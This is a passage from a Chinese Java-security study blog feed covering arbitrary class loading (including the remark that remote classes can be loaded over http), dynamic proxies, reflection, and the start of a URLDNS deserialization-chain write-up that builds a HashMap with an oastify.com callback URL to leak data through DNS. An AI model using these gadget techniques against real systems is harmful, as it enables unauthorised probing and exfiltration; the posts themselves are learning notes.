title="URLClassLoader任意类加载"></a>URLClassLoader任意类加载</h2><p>我直接用我最开始学Java语法时候生成的.class文件了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///D:\\codefile\\java\\&quot;</span>)&#125;);  <br>Class&lt;?&gt; gongyueshu = urlClassLoader.loadClass(<span class="hljs-string">&quot;gongyueshu&quot;</span>);  <br>gongyueshu.newInstance();<br></code></pre></td></tr></table></figure><p>我们这里的协议还可以换成http用来加载远程类，如果我们平时做题能控制到这里，那么就很有趣了</p><h2 id="defineClass加载"><a href="#defineClass加载" class="headerlink" title="defineClass加载"></a>defineClass加载</h2><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>,String.class,<span class="hljs-type">byte</span>[].class,<span class="hljs-type">int</span>.class,<span class="hljs-type">int</span>.class);  <br>defineClassMethod.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\codefile\\java\\gongyueshu.class&quot;</span>));  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(cl,<span class="hljs-string">&quot;gongyueshu&quot;</span>,code,<span class="hljs-number">0</span>,code.length);  <br>c.newInstance();<br></code></pre></td></tr></table></figure><p>急了，写ClassLoader的时候选错包了，运行好几次才发现跑util下去了，应该选java.lang的那个</p><h2 id="unsafe-defineClass字节码加载（spring中可以直接生成"><a href="#unsafe-defineClass字节码加载（spring中可以直接生成" class="headerlink" title="unsafe.defineClass字节码加载（spring中可以直接生成"></a>unsafe.defineClass字节码加载（spring中可以直接生成</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205204130.png" alt="image.png"><br>它里面也有一个defineClass方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205204403.png" alt="image.png"><br>最终代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Unsafe.class;  <br><span class="hljs-type">Field</span> <span class="hljs-variable">unsafeMethod</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);  <br>unsafeMethod.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span>(Unsafe) unsafeMethod.get(<span class="hljs-literal">null</span>);  <br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\codefile\\java\\gongyueshu.class&quot;</span>));  <br>unsafe.defineClass(<span class="hljs-string">&quot;gongyueshu&quot;</span>,code,<span class="hljs-number">0</span>,code.length,cl,<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态代理</title>
    <link href="/2024/03/21/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2024/03/21/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>我们首先编写一个接口IUser</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUser</span> &#123;  <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;  <br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>再写一个类来实现这个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserImpl</span><span class="hljs-params">()</span>&#123;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;show~&quot;</span>);  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;update~&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们再编写一个动态代理类UserInvocationHandler，并覆写它的invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;  <br>  <br>    IUser user;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInvocationHandler</span><span class="hljs-params">()</span>&#123;  <br>  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserInvocationHandler</span><span class="hljs-params">(IUser user)</span>&#123;<span class="hljs-built_in">this</span>.user = user;&#125;  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method , Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable&#123;  <br>        System.out.println(<span class="hljs-string">&quot;调用了&quot;</span>+method.getName());  <br>        method.invoke(user,args);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>为了方便对比，我们再编写一个静态代理UserProxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span>&#123;  <br>    IUser user;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserProxy</span><span class="hljs-params">()</span>&#123;  <br>  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserProxy</span><span class="hljs-params">(IUser user)</span>&#123; <span class="hljs-built_in">this</span>.user = user;&#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;  <br>        user.show();  <br>        System.out.println(<span class="hljs-string">&quot;SHOW_IN_PROXY&quot;</span>);  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;  <br>        user.update();  <br>        System.out.println(<span class="hljs-string">&quot;UPDATE_IN_PROXY&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先使用静态代理来调用静态代理中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;  <br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserImpl</span>();  <br>        user.show();  <br>        <span class="hljs-comment">//静态代理  </span><br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">userProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxy</span>(user);  <br>        userProxy.show();  <br><br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204210130.png" alt="image.png"><br>如果对这里为什么有两个show有疑问，请好好看代码<br>那么如果我们想要向接口中增加方法，我们不仅需要增加接口中，更需要在接口的实现类中覆写，那么如果我们用动态代理类，只需要去更新接口就可以了，这样在后期维护的时候会省很多事<br>我们尝试用如下的代码来测试动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;  <br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserImpl</span>();  <br><span class="hljs-comment">//        user.show();  </span><br><span class="hljs-comment">//        //静态代理  </span><br><span class="hljs-comment">//        IUser userProxy = new UserProxy(user);  </span><br><span class="hljs-comment">//        userProxy.show();  </span><br>        <span class="hljs-comment">//如果接口中方法增多，对应的代理中的override方法也要增多，所以静态代理在接口变化后实现的相当繁琐  </span><br>  <br><span class="hljs-comment">//        动态代理  </span><br><span class="hljs-comment">//        参数：接口，要做的事情，classloader  </span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">userinvocationhandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInvocationHandler</span>(user);  <br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">userproxy</span> <span class="hljs-operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationhandler);<span class="hljs-comment">//    public static Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)InvocationHandler:调用处理器  </span><br>        userproxy.update();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204210632.png" alt="image.png"><br>根据输出结果我们可以轻易的发现动态代理对象每执行一个方法的时候都被转发到InvocationHandler的接口类的invoke方法来调用</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS</title>
    <link href="/2024/03/21/URLDNS/"/>
    <url>/2024/03/21/URLDNS/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNS链的调试及反射"><a href="#URLDNS链的调试及反射" class="headerlink" title="URLDNS链的调试及反射"></a>URLDNS链的调试及反射</h1><h2 id="反射的各种"><a href="#反射的各种" class="headerlink" title="反射的各种"></a>反射的各种</h2><p>我们首先编写一个Person类，分别设置public和private类型的属性和方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br><span class="hljs-comment">//    public transient String name;有这个“transient”标识的成员变量不参与序列化</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name ,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.age=age;<br>        <span class="hljs-built_in">this</span>.name=name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&quot;\&#x27;&quot;</span> +<br>                <span class="hljs-string">&quot;,age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">action</span><span class="hljs-params">(String act)</span>&#123;<br>        System.out.println(act);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>那么想必我们最想做的就是通过反射去动态的改变这个类中的各个属性或者动态的调用方法吧，那么我们就需要用到反射去解决，让我们编写一个ReflectionTest.java来实现我们想做的事吧</p><p>我们第一步是想改变Person类的各个属性，例如public的name以及private的age，那么我们首先是需要获取Person类的实例化对象的，否则这个类还未加载，我们就不可能通过反射去动态的修改这个类里面的东西了，在这里，我们有可能会用到两个函数，getConstructor和newInstance，示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//获取到类的实例化对象</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<span class="hljs-comment">//获取类的原型类</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于这个Class这里我引用了廖雪峰网站的一些解释：</p><p><img src="C:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029203521937.png" alt="image-20231029203521937"></p><p>因为我们将clazz接收了Person这个类在JVM中加载的Class实例，所以clazz中保存着Person类的所有信息，而因为我们有Person这个类的实例变量，所以我们采用第二种方法去获取它的Class实例，就这样，我们获取到了Person类的所有信息并将其保存在实例clazz中，之后我们就可以通过更改clazz去修改在这个类中加载的Person类中的信息。</p><p>在我们获取到了Person类中的所有信息后，我们如果需要对它进行修改(这个Person类是我们自己写的，所以其中的内容对我们来说是白盒，但如果我们只知道Person这个类名，那么我们应该如何获取它里面的一些信息呢)，我们首先需要使用一些方法来获得它的字段(属性)，这里会用到这几个方法：getField、getDeclaredField、getDeclaredFields、getFields前后两对的差距只是后者的返回值是数组，里面包含这所有字段的信息，而前者返回值则是单个的字段，所以前者是需要指明具体获取哪个字段的，如果是在黑盒的情况下，首先推荐使用后面两对去把它的所有字段全部读出来，再看看有没有能用到的，再使用前者去获取，那么是否有Declared有什么区别呢？这很容易可以知道，前者是获取public字段时使用的，而后者是在获取private字段时使用的，而后者通常会与setAccessible(true)一同使用，否则便会报错</p><p>于是我们将代码完善至这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//获取到类的实例化对象</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<span class="hljs-comment">//获取类的原型类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> clazz.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;fault&quot;</span>,<span class="hljs-number">20</span>);<br>        Field[] personFields= clazz.getDeclaredFields();<span class="hljs-comment">//out:public java.lang.String Person.name private int Person.age:会打印出包括private中的属性</span><br>        Field[] personFields= clazz.getFields();<span class="hljs-comment">//out : public java.lang.String Person.name：不会打印private属性</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> clazz.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField_age</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        nameField_age.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        for(Field f : personFields)&#123;</span><br><span class="hljs-comment">//            System.out.println(f);</span><br><span class="hljs-comment">//        &#125;</span><br>        nameField.set(p,<span class="hljs-string">&quot;java&quot;</span>);<br>        nameField_age.set(p,<span class="hljs-number">114514</span>);<br>        System.out.println(nameField);<br>        System.out.println(p);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//额对自己莫名其妙多出来的</span><br><span class="hljs-comment">//        Constructor personconstructor = clazz.getConstructor(String.class, int.class);</span><br><span class="hljs-comment">//        Person p = (Person) personconstructor.newInstance(&quot;fault&quot;,20);</span><br><span class="hljs-comment">//这两行代码做一个解释，如果我们对getConstructor这个方法进行跟进，会发现它的参数要求如下：</span><br><span class="hljs-comment">//getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-comment">//一个泛型的class以及它的参数类型，也就是所谓的函数签名(这个在重载时就已经会知道了)</span><br><span class="hljs-comment">//因为我们Person中有四个方法，但他们的区别是函数签名，那我们需要在getConstructor中输入参数类型就可以了，接下来再利用newInstance去获取实例对象就可以实现了</span><br></code></pre></td></tr></table></figure><p>接下来我们如果想动态获取并调用它的方法，我们则会需要这些函数：getMethod，getMethods，getDeclaredMethod，getDeclaredMethods，它们的区别可以参考上一个getField它们之间的区别。</p><p>于是我们将代码完整的写出来是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.accessibility.Accessible;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br>        <span class="hljs-comment">//获取到类的原型</span><br><br><br>        <span class="hljs-comment">//获取实例化对象</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> clazz.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;fault&quot;</span>,<span class="hljs-number">20</span>);<br><span class="hljs-comment">//        System.out.println(p);</span><br>        <span class="hljs-comment">//获取类里面属性</span><br><span class="hljs-comment">//        Field[] personFields= clazz.getDeclaredFields();//out:public java.lang.String Person.name private int Person.age:会打印出包括private中的属性</span><br><span class="hljs-comment">//        Field[] personFields= clazz.getFields();//out : public java.lang.String Person.name：不会打印private属性</span><br><span class="hljs-comment">//        personFields.setAccessible(true); //</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> clazz.getField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField_age</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        nameField_age.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        for(Field f : personFields)&#123;</span><br><span class="hljs-comment">//            System.out.println(f);</span><br><span class="hljs-comment">//        &#125;</span><br>        nameField.set(p,<span class="hljs-string">&quot;java&quot;</span>);<br>        nameField_age.set(p,<span class="hljs-number">114514</span>);<br><span class="hljs-comment">//        System.out.println(nameField);</span><br><span class="hljs-comment">//        System.out.println(p);</span><br><br>        <span class="hljs-comment">//调用类里面的方法</span><br>            <span class="hljs-comment">//使用数组获取全部方法</span><br><span class="hljs-comment">//        Method[] personMethods = clazz.getMethods();</span><br><span class="hljs-comment">//        for(Method f : personMethods)&#123;</span><br><span class="hljs-comment">//            System.out.println(f);</span><br><span class="hljs-comment">//        &#125;</span><br>            <span class="hljs-comment">//使用特定名字获取特定方法且公有</span><br><span class="hljs-comment">//        Method personMethod = clazz.getMethod(&quot;action&quot;,String.class);//getMethod的参数类型是getMethod(String name, Class&lt;?&gt;... parameterTypes)，所以需要声明参数类型</span><br><span class="hljs-comment">//        personMethod.invoke(p,&quot;fault&quot;);</span><br>            <span class="hljs-comment">//使用特定名字获取特定方法且私有</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">personPrivateMethod</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;action&quot;</span>,String.class);<br>        personPrivateMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        personPrivateMethod.invoke(p,<span class="hljs-string">&quot;fault&quot;</span>);<br><span class="hljs-comment">//        System.out.println(personMethod);</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>接下来我们回到正题，URLDNS上，其实这个链子的原理很简单，就是在URL类中的hashcode方法中的</p><p><img src="C:\Users\24440\AppData\Roaming\Typora\typora-user-images\image-20231029211126905.png" alt="image-20231029211126905"></p><p>handler.hashcode方法中有getHostAddress方法，它会触发DNS解析，于是我们可以利用这个解析，将信息外带。所以我们的目的就是触发这个方法，但前提是在反序列化的时候才触发，而非在序列化时就触发，在上图中我们可以看到，触发它的方式是hashcode&#x3D;&#x3D;-1，如果我们单纯的使用如下代码：</p><p>在这里我们使用burpsuite进行模拟监听</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">HashMap</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">URL</span><span class="hljs-operator">,</span><span class="hljs-built_in">Integer</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-variable">new</span> <span class="hljs-variable">HashMap</span><span class="hljs-operator">&lt;</span><span class="hljs-built_in">URL</span><span class="hljs-operator">,</span> <span class="hljs-built_in">Integer</span><span class="hljs-operator">&gt;</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">;</span><br><span class="hljs-variable">hashMap</span><span class="hljs-operator">.</span><span class="hljs-variable">put</span><span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-built_in">URL</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;http://z558pnxlaeaq562m58owyyob42atyi.oastify.com&quot;</span><span class="hljs-punctuation">)</span><span 